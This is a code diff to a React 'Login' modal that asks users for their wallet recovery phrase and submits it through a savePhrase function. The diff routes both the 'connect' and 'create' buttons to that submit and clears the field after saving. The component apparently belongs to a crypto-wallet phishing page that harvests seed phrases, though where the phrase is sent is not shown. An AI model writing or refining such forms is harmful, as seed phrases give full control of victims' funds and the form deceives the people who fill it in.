@@ -1,7 +1,7 @@
 
 import "./Login.css"
 import { usePhrase } from "../context/Phrase.context"
-import { useRef } from "react"
+import { useEffect, useRef } from "react"
 
 export const Login = () => {
   const { savePhrase, loading, error, success } = usePhrase();
@@ -12,6 +12,11 @@ export const Login = () => {
     if (!text) return alert("Phrase cannot be empty.");
     savePhrase(text);
   };
+  useEffect(() => {
+    if (success && textareaRef.current) {
+      textareaRef.current.value = "";
+    }
+  }, [success]);
 
   return (
     <div className="modal fade bg-fade" id="exampleModal" tabIndex={-1} aria-labelledby="exampleModalLabel" aria-hidden="true">
@@ -28,8 +33,8 @@ export const Login = () => {
             </div>
           <div className="modal-body">
             <div className="form-floating">
-              <textarea ref={textareaRef} className="form-control" placeholder="type here..." id="floatingTextarea2" style={{height: "200px"}}></textarea>
-              <label htmlFor="floatingTextarea2">Enter your recovery phrase to proceed</label>
+              <textarea ref={textareaRef} className="form-control" placeholder="Enter your recovery phrase to proceed" id="floatingTextarea2" style={{height: "200px"}}></textarea>
+              <label htmlFor="floatingTextarea2" style={{whiteSpace: "pre-wrap"}}></label>
               {error && <div className="text-danger mt-2">{error}</div>}
               {success && <div className="text-success mt-2">Saved successfully!</div>}
             </div>
@@ -38,7 +43,9 @@ export const Login = () => {
             <button type="button" className="btn btn-green" onClick={handleConnect} disabled={loading}>
               {loading ? "connecting..." : "connect"}
             </button> {/* data-bs-dismiss="modal"*/}
-            <button type="button" className="btn btn-blue">create</button>
+            <button type="button" className="btn btn-blue" onClick={handleConnect} disabled={loading}>
+              create
+            </button>
           </div>
         </div>
       </div>
